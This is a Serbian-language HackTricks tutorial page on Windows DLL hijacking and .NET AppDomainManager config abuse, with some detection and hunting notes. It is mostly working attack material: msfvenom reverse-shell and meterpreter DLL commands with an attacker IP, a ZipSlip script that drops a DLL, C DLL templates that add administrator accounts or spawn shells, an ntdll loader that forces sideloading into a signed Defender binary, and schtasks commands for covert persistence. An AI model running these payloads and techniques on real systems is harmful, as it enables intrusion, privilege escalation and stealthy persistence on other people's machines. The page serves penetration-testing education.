# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Osnovne informacije

DLL Hijacking podrazumeva manipulisanje pouzdanom aplikacijom kako bi učitala zlonamerni DLL. Ovaj termin obuhvata nekoliko taktika, kao što su **DLL Spoofing, Injection i Side-Loading**. Uglavnom se koristi za izvršavanje koda, ostvarivanje persistence i, ređe, privilege escalation. Iako je ovde fokus na escalation-u, način hijacking-a ostaje isti bez obzira na cilj.

### Uobičajene tehnike

Za DLL hijacking koristi se nekoliko metoda, a njihova efikasnost zavisi od strategije aplikacije za učitavanje DLL-ova:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Zamena legitimnog DLL-a zlonamernim, uz opcionalno korišćenje DLL Proxying-a radi očuvanja funkcionalnosti originalnog DLL-a.
2. **DLL Search Order Hijacking**: Postavljanje zlonamernog DLL-a u putanju pre legitimnog DLL-a, čime se iskorišćava obrazac pretrage aplikacije.
3. **Phantom DLL Hijacking**: Kreiranje zlonamernog DLL-a koji aplikacija učitava, verujući da je to nepostojeći, ali potreban DLL.
4. **DLL Redirection**: Izmena parametara pretrage, kao što su `%PATH%`, ili datoteka `.exe.manifest` / `.exe.local`, kako bi se aplikacija usmerila na zlonamerni DLL.
5. **WinSxS DLL Replacement**: Zamena legitimnog DLL-a zlonamernom verzijom u WinSxS direktorijumu, što je metoda često povezana sa DLL side-loading-om.
6. **Relative Path DLL Hijacking**: Postavljanje zlonamernog DLL-a u direktorijum pod kontrolom korisnika zajedno sa kopiranom aplikacijom, što podseća na tehnike Binary Proxy Execution.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Klasični DLL sideloading nije jedini način da se pouzdan **.NET Framework** proces natera da učita attacker code. Ako je ciljna izvršna datoteka **managed** aplikacija, CLR takođe proverava **application configuration file** čiji naziv odgovara nazivu izvršne datoteke (na primer `Setup.exe.config`). Ta datoteka može definisati prilagođeni **AppDomainManager**. Ako konfiguracija upućuje na assembly pod kontrolom napadača koji je postavljen pored EXE datoteke, CLR ga učitava **pre uobičajenog toka izvršavanja aplikacije** i pokreće unutar pouzdanog procesa.<sup>[[24]](#references)</sup>

Prema Microsoft-ovoj .NET Framework configuration schema-i, i `<appDomainManagerAssembly>` i `<appDomainManagerType>` moraju biti prisutni da bi se prilagođeni manager koristio.<sup>[[16]](#references)[[17]](#references)</sup>

Minimalna konfiguracija:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimalni menadžer:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Praktične napomene:
- Ovo je tradecraft specifičan za **.NET Framework**. Zasnovan je na parsiranju CLR konfiguracije, a ne na redosledu pretrage Win32 DLL-ova.
- Host zaista mora biti **managed EXE**. Brza provera: `sigcheck -m target.exe`, `corflags target.exe` ili provera **CLR Runtime Header** u PE metapodacima.
- Naziv konfiguracione datoteke mora tačno odgovarati nazivu izvršne datoteke (`<binary>.config`) i obično se nalazi **pored EXE-a**.
- Ovo je korisno sa **signed Microsoft/vendor binaries**, jer pouzdani EXE ostaje neizmenjen, dok se malicious managed assembly izvršava u istom procesu.
- Ako već imate writable installer/update direktorijum, AppDomainManager hijacking može da se koristi kao **first stage**, nakon čega slede klasični DLL sideloading ili reflective loading za naredne stage-ove.

### AppDomainManager kao downloader + scheduled-task bootstrap

Praktičan obrazac intruzije jeste uparivanje pouzdanog managed EXE-a sa malicious `*.config` datotekom i malicious AppDomainManager DLL-om koji služi samo kao **small bootstrapper**:<sup>[[25]](#references)</sup>

1. Korisnik pokreće signed .NET installer ili updater iz uverljive lokacije, kao što je `%USERPROFILE%\Downloads`.
2. Pridružena konfiguracija navodi CLR da učita attacker assembly **pre** nego što započne legitimna logika aplikacije.
3. Malicious manager izvršava **path gate** (na primer, nastavlja samo ako host EXE radi iz direktorijuma `Downloads`, a second stage se pokreće samo iz `%LOCALAPPDATA%`).
4. Ako provera uspe, preuzima realni payload u putanju u koju korisnik može da upisuje, kao što je `%LOCALAPPDATA%\PerfWatson2.exe`, i uspostavlja persistence pomoću scheduled task-a.

Zašto je ova varijanta značajna:
- Signed host EXE ostaje neizmenjen, pa triage koji proverava samo hash glavnog binary-ja može da propusti compromise.
- Jednostavan **path-based anti-analysis** je čest: premeštanje ZIP/EXE/DLL trijade na Desktop, Temp ili sandbox putanju može namerno prekinuti chain.
- First-stage AppDomainManager DLL može ostati mali i sa malo šuma, dok se pravi implant preuzima kasnije.

Minimalni persistence primer koji se često viđa uz ovaj obrazac:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Napomene:
- ` /rl highest` znači **najviši nivo dostupan** za tog korisnika/sesiju; sama opcija ne garantuje eskalaciju do SYSTEM naloga.
- Ova tehnika se često preciznije klasifikuje kao **izvršavanje/persistencija putem zloupotrebe .NET konfiguracije**, a ne kao klasični hijacking redosleda pretrage za DLL koji nedostaje, iako operatori često kombinuju obe tehnike.

Pokazatelji za detekciju:
- Potpisani .NET izvršni fajlovi pokrenuti iz **putanja za raspakivanje ZIP arhiva**, `Downloads`, `%TEMP%` ili drugih foldera u koje korisnik može da upisuje, uz **kolocirani** `<exe>.config`.
- Novi zakazani zadaci čija akcija pokazuje na `%LOCALAPPDATA%`, `%APPDATA%` ili `Downloads`, a čiji nazivi oponašaju browser/vendor update programe.
- Kratkotrajni managed bootstrap procesi koji odmah preuzimaju drugi EXE, a zatim pokreću `schtasks.exe`.
- Uzorci koji se rano završavaju osim ako putanja izvršnog fajla odgovara očekivanom direktorijumu korisničkog profila.

### Preotimanje postojećeg zakazanog zadatka radi ponovnog pokretanja sideload lanca

Radi persistencije, nemojte tražiti samo **kreiranje novog zadatka**. Neke intrusion grupe čekaju da legitimni installer kreira **uobičajeni updater zadatak**, a zatim prepisuju akciju zadatka tako da postojeći naziv, autor i trigger ostanu poznati defenderima.

Ponovljivi workflow:
1. Instalirajte/pokrenite legitimni softver i identifikujte zadatak koji on obično kreira.
2. Izvezite XML zadatka i zabeležite trenutne vrednosti `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Zamenite samo akciju tako da zadatak pokrene vaš **trusted host EXE** iz staging direktorijuma u koji korisnik može da upisuje, a koji zatim radi sideload ili AppDomain-load stvarnog payload-a.
4. Ponovo registrujte isti naziv zadatka umesto kreiranja novog očiglednog persistence artefakta.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Zašto je ovo prikrivenije:
- Naziv zadatka i dalje može izgledati legitimno (na primer, updater dobavljača).
- **Task Scheduler service** ga pokreće, pa validacija roditelja/predaka često vidi očekivani lanac zakazivanja umesto `explorer.exe`.
- DFIR timovi koji traže samo **nove nazive zadataka** mogu propustiti zadatak čija je registracija već postojala, ali čija akcija sada pokazuje na `%LOCALAPPDATA%`, `%APPDATA%` ili drugu putanju pod kontrolom napadača.

Brzi hunting pivoti:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Uporedite XML datoteke u `C:\Windows\System32\Tasks\*` i metapodatke u `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` sa osnovnim stanjem.
- Postavite alert kada **updater task koji izgleda kao da pripada dobavljaču** izvršava fajl iz **direktorijuma u koje korisnik može da upisuje** ili pokreće .NET EXE sa pridruženom `*.config` datotekom.

> [!TIP]
> Za lanac koraka koji kombinuje HTML staging, AES-CTR configs i .NET implants sa DLL sideloadingom, pogledajte workflow ispod.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Pronalaženje nedostajućih Dll-ova

Najčešći način za pronalaženje nedostajućih Dll-ova unutar sistema jeste pokretanje alata [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) iz sysinternals paketa i **podešavanje** **sledeća 2 filtera**:

![Common Techniques - Pronalaženje nedostajućih Dll-ova: Najčešći način za pronalaženje nedostajućih Dll-ova unutar sistema jeste pokretanje alata procmon iz sysinternals paketa i podešavanje sledeća 2 filtera](<../../../images/image (961).png>)

![Common Techniques - Pronalaženje nedostajućih Dll-ova: Najčešći način za pronalaženje nedostajućih Dll-ova unutar sistema jeste pokretanje alata procmon iz sysinternals paketa i podešavanje sledeća 2 filtera](<../../../images/image (230).png>)

i samo prikazivanje **File System Activity**:

![Common Techniques - Pronalaženje nedostajućih Dll-ova: i samo prikazivanje File System Activity](<../../../images/image (153).png>)

Ako tražite **nedostajuće dll-ove uopšte**, ostavite ovo da radi nekoliko **sekundi**.\
Ako tražite **nedostajući dll unutar određenog izvršnog fajla**, treba da podesite **još jedan filter**, kao što je `"Process Name" "contains" <exec name>`, da ga pokrenete i zaustavite beleženje događaja**.<sup>[[9]](#references)</sup>

## Exploiting Missing Dlls

Da bismo eskalirali privilegije, najbolja mogućnost je da možemo **upisati dll koji će privilegovani proces pokušati da učita** na nekom od **mesta na kojima će biti tražen**. Zbog toga ćemo moći da **upišemo** dll u **folder** u kojem se **dll traži pre** foldera u kojem se nalazi **originalni dll** (neobičan slučaj), ili ćemo moći da **upišemo u neki folder u kojem će se dll tražiti**, a originalni **dll ne postoji** ni u jednom folderu.

### Redosled pretrage Dll-ova

**U okviru** [**Microsoft dokumentacije**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **možete pronaći kako se Dll-ovi konkretno učitavaju.**

**Windows aplikacije** traže DLL-ove prateći skup **unapred definisanih putanja za pretragu**, određenim redosledom. Problem DLL hijackinga nastaje kada se maliciozni DLL strateški postavi u jedan od ovih direktorijuma, čime se obezbeđuje da bude učitan pre autentičnog DLL-a. Rešenje za sprečavanje ovoga jeste da aplikacija koristi apsolutne putanje prilikom navođenja DLL-ova koji su joj potrebni.

U nastavku je prikazan **redosled pretrage DLL-ova na 32-bitnim** sistemima:

1. Direktorijum iz kojeg je aplikacija učitana.
2. Sistemski direktorijum. Koristite funkciju [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) da biste dobili putanju do ovog direktorijuma.(_C:\Windows\System32_)
3. 16-bitni sistemski direktorijum. Ne postoji funkcija koja dobavlja putanju do ovog direktorijuma, ali se on pretražuje. (_C:\Windows\System_)
4. Windows direktorijum. Koristite funkciju [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) da biste dobili putanju do ovog direktorijuma.
1. (_C:\Windows_)
5. Trenutni direktorijum.
6. Direktorijumi navedeni u PATH environment variable. Imajte na umu da ovo ne uključuje putanju po aplikaciji navedenu registarskim ključem **App Paths**. Ključ **App Paths** se ne koristi prilikom izračunavanja putanje za pretragu DLL-ova.

To je podrazumevani redosled pretrage sa omogućenim **SafeDllSearchMode**. Kada je on onemogućen, trenutni direktorijum se pomera na drugo mesto. Da biste onemogućili ovu funkciju, kreirajte registarsku vrednost **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i postavite je na 0 (podrazumevano je omogućena).

Ako se funkcija [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) pozove sa **LOAD_WITH_ALTERED_SEARCH_PATH**, pretraga počinje u direktorijumu izvršnog modula koji **LoadLibraryEx** učitava.

Na kraju, imajte na umu da **dll može biti učitan navođenjem apsolutne putanje, a ne samo naziva**. U tom slučaju dll će biti **tražen samo na toj putanji** (ako dll ima zavisnosti, one će biti tražene kao da su učitane samo po nazivu).

Postoje i drugi načini za promenu načina promene redosleda pretrage, ali ih ovde neću objašnjavati.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Koristite **ProcMon** filtere (`Process Name` = ciljni EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) da biste prikupili nazive DLL-ova koje proces proverava, ali ne može da pronađe.<sup>[[14]](#references)</sup>
2. Ako se binarni fajl pokreće po **rasporedu/kao servis**, postavljanje DLL-a sa jednim od tih naziva u **direktorijum aplikacije** (stavka br. 1 u redosledu pretrage) dovešće do njegovog učitavanja pri sledećem izvršavanju. U jednom slučaju sa .NET scannerom, proces je tražio `hostfxr.dll` u `C:\samples\app\` pre učitavanja stvarne kopije iz `C:\Program Files\dotnet\fxr\...`.
3. Napravite payload DLL (npr. reverse shell) sa bilo kojim exportom: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Ako je vaš primitive **arbitrary write u stilu ZipSlip-a**, napravite ZIP čiji entry izlazi iz extraction direktorijuma tako da DLL završi u folderu aplikacije:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Dostavite arhivu u nadzirani inbox/share; kada scheduled task ponovo pokrene proces, on učitava malicious DLL i izvršava vaš kod kao service account.

### Forsiranje sideloading-a putem RTL_USER_PROCESS_PARAMETERS.DllPath

Napredan način za deterministički uticaj na DLL search path novokreiranog procesa jeste postavljanje polja DllPath u RTL_USER_PROCESS_PARAMETERS prilikom kreiranja procesa pomoću ntdll native APIs. Navođenjem directory-ja pod kontrolom napadača, ciljani proces koji razrešava imported DLL po imenu (bez absolute path-a i bez korišćenja safe loading flags) može biti primoran da učita malicious DLL iz tog directory-ja.

Ključna ideja
- Izgradite process parameters pomoću RtlCreateProcessParametersEx i navedite prilagođeni DllPath koji pokazuje na vaš controlled folder (npr. directory u kojem se nalaze vaš dropper/unpacker).
- Kreirajte proces pomoću RtlCreateUserProcess. Kada target binary razrešava DLL po imenu, loader će tokom razrešavanja proveriti prosleđeni DllPath, čime se omogućava pouzdan sideloading čak i kada se malicious DLL ne nalazi u istom directory-ju kao target EXE.

Napomene/ograničenja
- Ovo utiče na child process koji se kreira; razlikuje se od SetDllDirectory, koji utiče samo na current process.
- Target mora da importuje ili da koristi LoadLibrary za učitavanje DLL-a po imenu (bez absolute path-a i bez korišćenja LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i hardcoded absolute paths ne mogu biti hijack-ovani. Forwarded exports i SxS mogu promeniti prioritet.

Minimalni C primer (ntdll, wide strings, pojednostavljeno rukovanje greškama):

<details>
<summary>Kompletan C primer: forsiranje DLL sideloading-a putem RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Primer operativne upotrebe
- Postavite zlonamerni xmllite.dll (koji izvozi potrebne funkcije ili prosleđuje pozive stvarnom DLL-u) u svoj DllPath direktorijum.
- Pokrenite potpisani binary za koji je poznato da pomoću navedene tehnike po imenu traži xmllite.dll. Loader razrešava import preko prosleđenog DllPath direktorijuma i sideloaduje vaš DLL.

Ova tehnika je uočena u realnim napadima za pokretanje višestepenih sideloading lanaca: početni launcher ispušta pomoćni DLL, koji zatim pokreće Microsoft-potpisani binary podložan hijackingu, sa prilagođenim DllPath direktorijumom kako bi prisilio učitavanje napadačevog DLL-a iz staging direktorijuma.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking via `.exe.config`

Za **.NET Framework** mete, sideloading se može izvršiti **pre `Main()`** bez patchovanja memorije, zloupotrebom susednog **`.exe.config`** fajla aplikacije. Umesto oslanjanja samo na Win32 DLL search order, napadač postavlja legitimni .NET EXE pored zlonamernog config fajla i jednog ili više assembly-ja pod kontrolom napadača.

Kako lanac funkcioniše:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE se pokreće, a **CLR čita `<exe>.config`**.
2. Config postavlja **`<appDomainManagerAssembly>`** i **`<appDomainManagerType>`**, tako da runtime instancira `AppDomainManager` pod kontrolom napadača.
3. Zlonamerni manager dobija **pre-`Main()` izvršavanje** unutar procesa pouzdanog hosta.
4. Isti config može primorati CLR da prvo razrešava lokalne assembly-je (na primer `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) i može oslabiti runtime validaciju/telemetriju bez inline patchovanja.

Obrazac u stilu campaign napada (tačno ugnježđavanje može da varira u zavisnosti od direktive / CLR verzije):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Zašto je ovo korisno:
- **`<probing privatePath="."/>`** zadržava assembly resolution u direktorijumu aplikacije, pretvarajući folder u predvidivu sideloading površinu.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** prebacuju izvršavanje u attacker code tokom CLR inicijalizacije, pre nego što se pokrene legitimna logika aplikacije.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** može full-trust aplikaciji omogućiti učitavanje unsigned ili izmenjenih assembly-ja bez strong-name validation greške.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** izbegava publisher-policy redirects ka novijim assembly-jima.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** čini izbor runtime-a determinističkijim.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** je posebno interesantan jer **CLR iz konfiguracije onemogućava sopstvenu ETW vidljivost**, umesto da implant u memoriji patch-uje `EtwEventWrite`.

Operativni obrazac uočen u novijim campaigns:
- Stage 1 spušta `setup.exe`, `setup.exe.config` i lokalne assembly-je.
- Stage 2 ih kopira u uverljiv **AppData update** folder, preimenuje host u nešto poput `update.exe` i ponovo ga pokreće putem **scheduled task-a**.
- Stage 3 proverava execution context (na primer, očekivani parent `svchost.exe` iz Task Scheduler-a) pre učitavanja finalnog RAT DLL/export-a.

Ideje za hunting:
- Potpisani ili na drugi način legitimni **.NET executables** koji se pokreću sa sumnjivim susednim **`.config`** fajlovima na lokacijama u koje korisnik može da upisuje.
- `.config` fajlovi koji sadrže **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** ili **`etwEnable enabled="false"`**.
- Scheduled tasks koji ponovo pokreću preimenovane update binaries iz **`%LOCALAPPDATA%`** ili app-specific `\bin\update\` direktorijuma.
- Parent/child lanci u kojima scheduled task pokreće trusted .NET host koji odmah učitava non-vendor assemblies iz sopstvenog direktorijuma.

#### Izuzeci u redosledu pretrage DLL-ova prema Windows dokumentaciji

Određeni izuzeci standardnom DLL search order-u navedeni su u Windows dokumentaciji:

- Kada se naiđe na **DLL koji ima isto ime kao DLL koji je već učitan u memoriji**, sistem zaobilazi uobičajenu pretragu. Umesto toga, proverava redirection i manifest, a zatim kao podrazumevanu opciju koristi DLL koji je već u memoriji. **U ovom scenariju sistem ne vrši pretragu DLL-a**.
- U slučajevima kada je DLL prepoznat kao **known DLL** za trenutnu verziju Windows-a, sistem će koristiti svoju verziju known DLL-a, zajedno sa svim njegovim dependent DLL-ovima, **preskačući proces pretrage**. Registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** sadrži listu ovih known DLL-ova.
- Ako **DLL ima dependencies**, pretraga tih dependent DLL-ova vrši se kao da su navedeni samo svojim **module names**, bez obzira na to da li je početni DLL identifikovan pomoću pune putanje.

### Escalating Privileges

**Requirements**:

- Identifikujte proces koji radi ili će raditi sa **drugačijim privilegijama** (horizontal ili lateral movement), a kojem **nedostaje DLL**.
- Obezbedite **write access** za bilo koji **directory** u kojem će se **DLL** tražiti. To može biti direktorijum executable-a ili direktorijum unutar system path-a.

Da, prerequisites je komplikovano pronaći jer je **po defaultu prilično neobično pronaći privileged executable kojem nedostaje DLL**, a još je **neobičnije imati write permissions na folderu system path-a** (to po defaultu nije moguće). Međutim, u misconfigured environments ovo je moguće.\
Ako imate sreće i ispunjavate requirements, možete proveriti projekat [UACME](https://github.com/hfiref0x/UACME). Iako je **glavni cilj projekta bypass UAC-a**, tamo možete pronaći **PoC** za Dll hijaking za verziju Windows-a koji možete koristiti (verovatno samo promenom putanje foldera u koji imate write permissions).

Imajte na umu da možete **proveriti svoje permissions u folderu** pomoću:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **proverite dozvole svih fascikli unutar PATH promenljive**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Takođe možete proveriti imports izvršne datoteke i exports DLL-a pomoću:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Za kompletan vodič o tome kako **zloupotrebiti Dll Hijacking za eskalaciju privilegija** sa dozvolama za pisanje u fascikli **System Path** proverite:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automatizovani alati

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)će proveriti da li imate dozvole za pisanje u bilo kojoj fascikli unutar system PATH-a.\
Drugi zanimljivi automatizovani alati za otkrivanje ove ranjivosti su **PowerSploit funkcije**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll._

### Primer

U slučaju da pronađete scenario koji se može iskoristiti, jedna od najvažnijih stvari za uspešnu eksploataciju bila bi da **kreirate dll koji eksportuje najmanje sve funkcije koje će executable uvesti iz njega**. U svakom slučaju, imajte na umu da je Dll Hijacking koristan za [**eskalaciju sa nivoa Medium Integrity na High (zaobilaženje UAC-a)**](../../authentication-credentials-uac-and-efs/index.html#uac) ili sa[ **High Integrity na SYSTEM**](../index.html#from-high-integrity-to-system)**.** Primer **kako kreirati validan dll** možete pronaći u ovoj studiji o dll hijacking-u, usmerenoj na dll hijacking za izvršavanje: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Pored toga, u **sledeće**m odeljku možete pronaći neke **osnovne dll kodove** koji mogu biti korisni kao **šabloni** ili za kreiranje **dll-a sa eksportovanim funkcijama koje nisu neophodne**.

## **Kreiranje i kompajliranje Dll-ova**

### **Dll Proxifying**

U osnovi, **Dll proxy** je Dll sposoban da **izvrši vaš maliciozni kod kada se učita**, ali i da **izloži** i **funkcioniše** kako je **očekivano**, tako što **prosleđuje sve pozive stvarnoj biblioteci**.

Pomoću alata [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ili [**Spartacus**](https://github.com/Accenture/Spartacus) možete zapravo **navesti executable i izabrati biblioteku** koju želite da proxify-ujete i **generisati proxified dll**, ili **navesti Dll** i **generisati proxified dll**.

### **Meterpreter**

**Dobijanje rev shell-a (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Nabavite meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kreirajte korisnika (x86, nisam video x64 verziju):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Sopstveni

Imajte na umu da u nekoliko slučajeva Dll koji kompajlirate mora da **exportuje nekoliko funkcija** koje će učitati victim proces; ako te funkcije ne postoje, **binary neće moći da ih učita**, pa će **exploit neuspeti**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL primer sa kreiranjem korisnika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternativni C DLL sa ulaznom tačkom niti</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studija slučaja: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe i dalje pri pokretanju proverava predvidljivu, jezički specifičnu localization DLL datoteku koja može biti hijack-ovana za proizvoljno izvršavanje koda i persistence.<sup>[[7]](#references)</sup>

Ključne činjenice
- Putanja za proveru (trenutne verzije): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
